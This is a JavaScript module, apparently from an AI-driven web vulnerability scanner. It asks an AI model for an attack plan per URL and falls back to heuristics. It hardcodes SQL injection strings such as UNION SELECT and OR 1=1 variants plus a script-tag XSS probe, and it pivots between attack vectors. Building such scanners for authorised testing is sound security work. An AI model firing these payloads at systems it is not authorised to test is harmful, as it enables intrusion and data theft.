'use strict';

const aiModel = require('./aiModel');

/**
 * Industry-Level Decision Engine
 * =============================
 * Dual-Engine System: AI Primary, Heuristic Fallback.
 * Fulfills Task 2.
 */

async function getInitialStrategy(reqCtx, baseline, inputs) {
    try {
        const strategy = await aiModel.decideInitialStrategy({
            url: reqCtx.url,
            method: reqCtx.method,
            params: inputs,
            pageContentSnippet: baseline.body.slice(0, 500)
        });

        if (strategy && strategy.attack_plan) return strategy;
    } catch (e) {
        console.warn('[DecisionEngine] AI failed, falling back to heuristics.');
    }

    // Heuristic Fallback
    return getHeuristicStrategy(reqCtx, inputs);
}

function getHeuristicStrategy(reqCtx, inputs) {
    const url = reqCtx.url.toLowerCase();
    const strategy = {
        endpoint_type: 'generic',
        attack_plan: ['sqli', 'xss'],
        priority: 'medium',
        initial_payloads: [
            { vector: 'sqli', payload: "' OR '1'='1'--" },
            { vector: 'xss', payload: "<script>alert(1)</script>" }
        ]
    };

    if (url.includes('login')) strategy.endpoint_type = 'login';
    if (url.includes('search')) strategy.endpoint_type = 'search';
    
    return strategy;
}

async function analyzeResults(context) {
    try {
        const analysis = await aiModel.analyzeAttackResult(context);
        if (analysis) return analysis;
    } catch (e) {
        console.warn('[DecisionEngine] AI Analysis failed, using heuristic validation.');
    }

    // Heuristic Fallback Analysis
    return {
        is_vulnerable: context.test.status !== context.baseline.status || Math.abs(context.test.length - context.baseline.length) > 500,
        confidence: 65,
        reasoning: 'Heuristic length/status anomaly detected (AI fallback).'
    };
}

async function pivot(history) {
    try {
        const adaptation = await aiModel.nextStrategy(history);
        if (adaptation && adaptation.next_vector) return adaptation;
    } catch (e) {
        console.warn('[DecisionEngine] AI Pivot failed, using fallback mutation.');
    }

    // Heavy Fallback (Hacker Logic)
    return { 
        next_vector: 'sqli', 
        new_payloads: ["' UNION SELECT ALL 1,2,3,4,5,6--", "' OR 1=1 LIMIT 1#"] 
    };
}

module.exports = { getInitialStrategy, analyzeResults, pivot };
